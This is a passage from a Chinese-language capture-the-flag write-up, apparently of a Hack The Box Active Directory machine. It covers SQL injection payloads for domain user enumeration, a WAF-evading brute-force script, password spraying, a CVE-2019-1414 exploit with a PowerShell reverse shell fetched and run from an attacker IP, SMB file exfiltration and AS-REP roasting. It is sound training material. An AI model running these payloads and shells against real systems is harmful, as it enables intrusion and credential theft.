zpowers</td><td>finance1</td></tr><tr><td>okent, rmartin, alyx, nbourne</td><td>banking1</td></tr><tr><td>minatotw, egre55</td><td>未知</td></tr></tbody></table></div><p>发现不知道密码的两个人身份是<code>CEO</code>，将密码重新保存至新的文件<code>passwds</code></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>将提取出来的密码保存下来，尝试使用<code>crackmapexec</code>进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.179 -u users -p passwords</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724161246263-1891197988.png" alt="image-20240724161241655"></p><p>都失败了，只能寻找其他办法了，尝试寻找其他数据库中的信息，然而这些数据库中没有有用的信息</p><h1 id="MSSQL-注入枚举域用户名"><a href="#MSSQL-注入枚举域用户名" class="headerlink" title="MSSQL 注入枚举域用户名"></a>MSSQL 注入枚举域用户名</h1><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><blockquote><p>通过网上搜索发现可以使用 RID 蛮力通过 MSSQL 注入来执行Active Directory枚举获取用户名</p><p>攻击原理：</p><ul><li>找出域名</li><li>找出域的SID</li><li>通过迭代一系列 RID 来确定每个对象的名称，从而构建用户、组和计算机 SID</li></ul><p><a href="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html">参考链接</a></p><p>SQL Server中有一个函数叫做SUSER_SID()可以用来，它可以返回给定用户的安全标识号（SID），使用它来标识主域管理员的SID。</p><p>利用SQL注入枚举域内用户主要用到两个函数是SUSER_SID和SUSER_SNAME</p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16">SUSER_SID()函数说明</a></p><p><a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16">SUSER_SNAME()函数说明</a></p><p>先使用SUSER_SID函数拿到域的SID，之后使用SUSER_SNAME函数通过之前拿到的SID进行拼接RID进行枚举域用户名，之后在通过拿到的域用户名喷洒之前获得的凭据密码。</p></blockquote><p>从之前<code>sqlmap</code>获取数据部分可以知道，字段数为5，回显位置是4</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182312718-55166275.png" alt="image-20240724182307833"></p><p>这里借助<code>CyberChef</code>工具的<code>Escape Unicode Characters</code>模块，可以很方便的帮助我们进行编码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724183224966-434528211.png" alt="image-20240724183219833"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724182733745-1169710557.png" alt="image-20240724182729157"></p><p>可以看到，将<code>sqlmap</code>跑出来的<code>Payload</code>经过<code>unicode</code>编码后，利用<code>burpsuite</code>发送仍然有效，数据显示在阿<code>email</code>位置，接下来就可以继续操作了</p><h2 id="获取默认域"><a href="#获取默认域" class="headerlink" title="获取默认域"></a>获取默认域</h2><p>第一步就是要获取域的名称，利用<code>default_domain()</code>函数获取域名</p><p><code>a &#39; union select 1,2,3,(select default_domain()),5 --</code></p><p>将<code>payload</code>编码后发送</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724184629285-1312604411.png" alt="image-20240724184624729"></p><p>可以获得域名<code>MEGACORP</code></p><h2 id="获取域的-SID"><a href="#获取域的-SID" class="headerlink" title="获取域的 SID"></a>获取域的 SID</h2><p>知道域名后，可以使用一致的内置账户或组（如：<code>Administrator</code>账户）注入获取<code>SID</code>值，在无类型转换的情况下会返回一个二进制数据，不利于我们读取，所以使用<code>sys.fn_varbintohexstr</code>将其包装起来，使其能够在<code>http</code>中直观地看出数据</p><blockquote><p><code>sys.fn_varbintohexstr</code> 是 Microsoft SQL Server 中的一个系统函数。它用于将二进制数据转换为十六进制字符串表示</p></blockquote><p><code>a &#39; union select 1,2,3,(select sys.fn_varbintohexstr(SUSER_SID(&#39;MEGACORP\Administrator&#39;))),5 --</code></p><p>将<code>payload</code>编码后发送</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724185434633-319141801.png" alt="image-20240724185429811"></p><p>这里就拿到了SID<code>的十六进制：</code>0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`</p><p>但是我们需要将这个16进制数据转换成<code>SID</code>格式，这里利用<code>python</code>脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_sid</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># 去掉前缀 &quot;0x&quot; 和可能的空格</span></span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节数组</span></span><br><span class="line">    byte_array = <span class="built_in">bytearray</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取第一个字节，它表示版本号</span></span><br><span class="line">    revision = byte_array[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二个字节表示标识符权限值的长度</span></span><br><span class="line">    sub_authority_count = byte_array[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接下来是6个字节的标识符权限值</span></span><br><span class="line">    identifier_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">2</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 剩下的字节是子授权值</span></span><br><span class="line">    sub_authorities = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sub_authority_count):</span><br><span class="line">        sub_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">8</span> + i*<span class="number">4</span>: <span class="number">12</span> + i*<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        sub_authorities.append(sub_authority)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组装SID字符串</span></span><br><span class="line">    sid = <span class="string">f&quot;S-<span class="subst">&#123;revision&#125;</span>-<span class="subst">&#123;identifier_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        sid += <span class="string">f&quot;-<span class="subst">&#123;sub_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sid</span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&quot;</span></span><br><span class="line">sid = hex_to_sid(hex_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SID: <span class="subst">&#123;sid&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190101967-1037261460.png" alt="image-20240724190057434"></p><p>最后就获得了<code>SID</code>：<code>S-1-5-21-3167813660-1240564177-918740779-500</code></p><h2 id="枚举用户RID"><a href="#枚举用户RID" class="headerlink" title="枚举用户RID"></a>枚举用户RID</h2><p>上一步获取了<code>Administertor</code>的<code>SID</code>，可以利用之前提到过的<code>SUSER_SNAME()</code>函数验证一下</p><p><code>a &#39; union select 1,2,3,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)),5 --</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190903604-191476298.png" alt="image-20240724190858542"></p><p>验证没问题，并且知道<code>Administertor</code>的<code>RID</code>是<code>500</code></p><p>接下来就可以通过这个<code>RID</code>的值来爆破其他域用户名，这里使用<code>python</code>脚本来实现，但是要注意不要请求的太快，请求太快会被<code>waf</code>拦截，用<code>sleep</code>函数来达到延时访问的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># SID转16进制</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sid_to_hex</span>(<span class="params">sid_str</span>):</span><br><span class="line">    parts = sid_str[<span class="number">2</span>:].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    revision = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">    identifier_authority = <span class="built_in">int</span>(parts[<span class="number">1</span>])</span><br><span class="line">    sub_authorities = [<span class="built_in">int</span>(part) <span class="keyword">for</span> part <span class="keyword">in</span> parts[<span class="number">2</span>:]]</span><br><span class="line">    hex_bytes = <span class="built_in">bytearray</span>([revision, <span class="built_in">len</span>(sub_authorities)])</span><br><span class="line">    hex_bytes.extend(identifier_authority.to_bytes(<span class="number">6</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        hex_bytes.extend(sub_authority.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + hex_bytes.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_escape</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">r&quot;\u&#123;:04x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://10.10.10.179/api/getColleagues&quot;</span></span><br><span class="line">sql = <span class="string">&quot;a&#x27; union select 1,2,3,(select SUSER_SNAME(&#123;&#125;)),5 --&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">10000</span>):</span><br><span class="line">    sid = <span class="string">&quot;S-1-5-21-3167813660-1240564177-918740779-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="built_in">str</span> = sid_to_hex(sid)</span><br><span class="line">    payload = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;&#x27;</span>+unicode_escape(sql.<span class="built_in">format</span>(<span class="built_in">str</span>))+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    r = requests.post(url, data=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>] :</span><br><span class="line">        <span class="built_in">print</span>(json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>])</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>运行上述脚本等待一会儿，就可以得到该域内几乎全部的用户名，将用户名保存到文件<code>users.txt</code>中，顺便把<code>MEGACORP\</code>过滤掉</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">Domain Admins</span><br><span class="line">Domain Users</span><br><span class="line">Domain Guests</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Cert Publishers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Group Policy Creator Owners</span><br><span class="line">Read-only Domain Controllers</span><br><span class="line">Cloneable Domain Controllers</span><br><span class="line">Protected Users</span><br><span class="line">Key Admins</span><br><span class="line">Enterprise Key Admins</span><br><span class="line">RAS and IAS Servers</span><br><span class="line">Allowed RODC Password Replication Group</span><br><span class="line">Denied RODC Password Replication Group</span><br><span class="line">MULTIMASTER$</span><br><span class="line">DnsAdmins</span><br><span class="line">DnsUpdateProxy</span><br><span class="line">svc-nas</span><br><span class="line">Privileged IT Accounts</span><br><span class="line">tushikikatomo</span><br><span class="line">andrew</span><br><span class="line">lana</span><br><span class="line">alice</span><br><span class="line">test</span><br><span class="line">dai</span><br><span class="line">svc-sql</span><br><span class="line">SQLServer2005SQLBrowserUser$MULTIMASTER</span><br><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">jsmmons</span><br><span class="line">pmartin</span><br><span class="line">Developers</span><br></pre></td></tr></table></figure><h2 id="二次密码喷洒登录tushikikatomo"><a href="#二次密码喷洒登录tushikikatomo" class="headerlink" title="二次密码喷洒登录tushikikatomo"></a>二次密码喷洒登录tushikikatomo</h2><p>用刚得到的用户名以及密码进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.179 -u users.txt -p passwds</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212704923-13932621.png" alt="image-20240724212700281"></p><p>最后也是在漫长的等待中，找到了正确的用户名和密码，在查看一下能否<code>winrm</code>登录</p><p><code>crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212837921-732608447.png" alt="image-20240724212832989"></p><p>可以登录，直接登录该用户</p><p><code>evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213111085-1525432495.png" alt="image-20240724213106549"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213155442-1793569265.png" alt="image-20240724213150692"></p><p>最后在<code>Desktop</code>目录下找到<code>user.txt</code></p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="bloodhound信息搜集"><a href="#bloodhound信息搜集" class="headerlink" title="bloodhound信息搜集"></a>bloodhound信息搜集</h2><p>先使用<code>bloodhound</code>进行信息搜集，看看能不能有有价值的信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725102932070-1881559902.png" alt="image-20240725102923819"></p><p>发现还有很多其他用户，但是没找到什么其他信息</p><p>还是去翻翻文件夹吧</p><p>也是翻了好久，最后在<code>Program Files</code>文件夹中，发现一堆应用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725111221575-575415943.png" alt="image-20240725111210668"></p><p>再看下进程看看那些应用在运行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725112503342-1413852341.png" alt="image-20240725112455699"></p><p>发现在最上面运行着一堆<code>Code</code>进程，猜测跟<code>VSCode</code>应用有关，确认一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726103348474-1758824233.png" alt="image-20240726103345887"></p><p>发现确实是该应用，看看该应用的版本</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726104232227-713737.png" alt="image-20240726104229382"></p><p>在<code>C:\Program Files\Microsoft VS Code\resources\app</code>目录下找到<code>package.json</code></p><p>在网上搜索该版本是否有漏洞，发现如下结果</p><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414">CVE-2019-1414</a></li></ul><h2 id="CVE-2019-1414登录cyork"><a href="#CVE-2019-1414登录cyork" class="headerlink" title="CVE-2019-1414登录cyork"></a>CVE-2019-1414登录cyork</h2><blockquote><p>当 Visual Studio Code 向本地计算机的用户公开调试侦听器时，它会存在特权提升漏洞。成功利用此漏洞的本地攻击者可以注入任意代码以在当前用户的上下文中运行。如果当前用户使用管理用户权限登录，则攻击者可以控制受影响的系统。<br><a href="https://iwantmore.pizza/posts/cve-2019-1414.html">详细利用方法</a></p></blockquote><p>使用工具<a href="https://github.com/taviso/cefdebug">cefdebug</a>可以利用这个漏洞</p><p>先将工具下载到本地，再将<code>cefdebug.exe</code>传到机器上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093323214-1165219866.png" alt="image-20240729093308415"></p><p>运行该文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093355745-1571258238.png" alt="image-20240729093341288"></p><p>扫描本地机器并成功获得了三个 <code>CEF</code> 调试器，随便找一个通过代码来验证</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code <span class="string">&quot;process.version&quot;</span> </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093416362-1657600438.png" alt="image-20240729093401071"></p><p>验证成功，发现可以执行命令，接下来就可以利用这个获取一个<code>shell</code></p><p>拿下面的<code>powershell</code>命令反弹<code>shell</code>，先将该命令保存为<code>shell.ps1</code>至本地</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;10.10.14.3&quot;</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">8888</span></span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="variable">$ip</span>, <span class="variable">$port</span>)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line"><span class="variable">$writer</span> = <span class="built_in">New-Object</span> System.IO.StreamWriter(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$reader</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="number">1024</span></span><br><span class="line"><span class="variable">$writer</span>.WriteLine(<span class="string">&quot;Shell connected!&quot;</span>)</span><br><span class="line"><span class="variable">$writer</span>.Flush()</span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$input</span> = <span class="variable">$reader</span>.ReadLine()) <span class="operator">-ne</span> <span class="string">&quot;exit&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$output</span> = (<span class="built_in">Invoke-Expression</span> <span class="variable">$input</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span>)</span><br><span class="line">    <span class="variable">$writer</span>.WriteLine(<span class="variable">$output</span>)</span><br><span class="line">    <span class="variable">$writer</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>在<code>kali</code>开启监听，同时开启<code>http</code>服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>最后使用<code>cefdebug.exe</code>运行 <code>CEF</code> 调试器的服务器执行反弹 <code>shell</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\cefdebug.exe <span class="literal">--url</span> ws://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">22048</span>/<span class="number">43667936</span><span class="literal">-2666-4f67-898b-5d4a75cd2f4a</span> <span class="literal">--code</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;powershell IEX(New-Object Net.WebClient).DownloadString(\&#x27;http://10.10.14.3/shell.ps1\&#x27;)&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>该命令将文件下载并执行而不是将文件传到机器上并执行，这样就绕过了本地的脚本执行策略</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093447413-368288370.png" alt="image-20240729093432988"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093520842-1996459293.png" alt="image-20240729093506601"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093507850-881670073.png" alt="image-20240729093453671"></p><p>这时我们就拿到了<code>cyork</code>用户的权限</p><h2 id="SMB传输敏感文件"><a href="#SMB传输敏感文件" class="headerlink" title="SMB传输敏感文件"></a>SMB传输敏感文件</h2><p>测试后发现<code>cyork</code>用户可以访问 <code>C:\inetpub\wwwroot\bin</code>目录，之前的用户访问是不行的</p><p>在这里发现了一些<code>dll</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729094451423-1978565072.png" alt="image-20240729094436832"></p><p>这里注意到有一个名为<code>MultimasterAPI.dll</code>的<code>DLL</code> </p><p>尝试利用<code>SMB</code>共享将文件下载下来</p><p>首先使用 <code>smbserver.py</code>建立一个共享服务器</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729100527970-1961370175.png" alt="image-20240729100513542"></p><p>在靶机上执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\10.10.14.3\share</span><br><span class="line">copy MultimasterAPI.dll x:</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104103094-1081529091.png" alt="image-20240729104048727"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104200842-1329366775.png" alt="image-20240729104143310"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104217347-1563767963.png" alt="image-20240729104203181"></p><p>此时发现已经将文件下载到本地了</p><h2 id="逆向分析dll文件获取密码"><a href="#逆向分析dll文件获取密码" class="headerlink" title="逆向分析dll文件获取密码"></a>逆向分析dll文件获取密码</h2><p>分析一下是什么文件 </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729105646125-1589069605.png" alt="image-20240729105631937"></p><p>发现是<code>.NET</code>文件，用<code>dnSpy</code>工具分析</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729110245688-624518175.png" alt="image-20240729110231243"></p><p>最后发现密码<code>D3veL0pM3nT!</code></p><h2 id="三次密码喷洒登录sbauer"><a href="#三次密码喷洒登录sbauer" class="headerlink" title="三次密码喷洒登录sbauer"></a>三次密码喷洒登录sbauer</h2><p>熟悉的密码，熟悉的用户名列表，再次进行密码喷洒。这次的用户名列表和第一次的一样</p><p><code>crackmapexec smb 10.10.10.179 -u users -p D3veL0pM3nT!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729111508437-1929996575.png" alt="image-20240729111442645"></p><p>再验证一下可不可以登录</p><p><code>crackmapexec winrm 10.10.10.179 -u sbauer -p &#39;D3veL0pM3nT!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112326611-1209904571.png" alt="image-20240729112311645"></p><p>可以远程登录，直接登录</p><p><code>evil-winrm -i 10.10.10.179 -u sbauer -p &#39;D3veL0pM3nT!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729112737022-1061168092.png" alt="image-20240729112710433"></p><p>登录成功，但是发现没什么可以直接利用能够提权的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729135847596-1147621995.png" alt="image-20240729135821896"></p><h2 id="bloodhound二次信息搜集"><a href="#bloodhound二次信息搜集" class="headerlink" title="bloodhound二次信息搜集"></a>bloodhound二次信息搜集</h2><p>现在我们已经拿下了三个用户，分别是<code>tushikikatomo</code>、<code>cyork</code>、<code>sbauer</code></p><p>在<code>bloodhound</code>中将他们标记为已经拿下的用户，然后点击<code>Shortest Paths to High Value Targets</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114754648-851746975.png" alt="image-20240729114739900"></p><p>看着就好复杂，但是仔细看会发现很多重要的信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729114950277-1415659020.png" alt="image-20240729114935752"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173507194-1884458758.png" alt="image-20240730173454585"></p><p>仔细看会发现<code>sbauer</code>用户和<code>jorden</code>用户有<code>GenericWrite</code>关系，并且<code>jorden</code>用户属于<code>SERVER_OPERATORS</code>组（高权限组），我们可以试试能否通过滥用<code>GenericWrite</code>权限实现横向移动</p><h2 id="滥用GenericWrite权限横移登录jorden"><a href="#滥用GenericWrite权限横移登录jorden" class="headerlink" title="滥用GenericWrite权限横移登录jorden"></a>滥用GenericWrite权限横移登录jorden</h2><blockquote><p>先看看之前提到的 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户破解密码哈希的技术。事实上，如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p></blockquote><p>可以使用下面这条命令来为<code>jorden</code>用户设置“不需要 <code>Kerberos</code> 预身份验证”的属性</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> jorden | <span class="built_in">Set-ADAccountControl</span> <span class="literal">-doesnotrequirepreauth</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730173952758-9402141.png" alt="image-20240730173951299"></p><p>使用<code>impactet</code>下的<code>GetNPUsers</code>脚本来获取<code>jorden</code>用户的<code>AS-REP</code>票据</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240730174416438-495478340.png" alt="image-20240730174414913"></p><p>这样就获取到了<code>AS-REP</code>票据，将上述票据保存至文件<code>hash</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 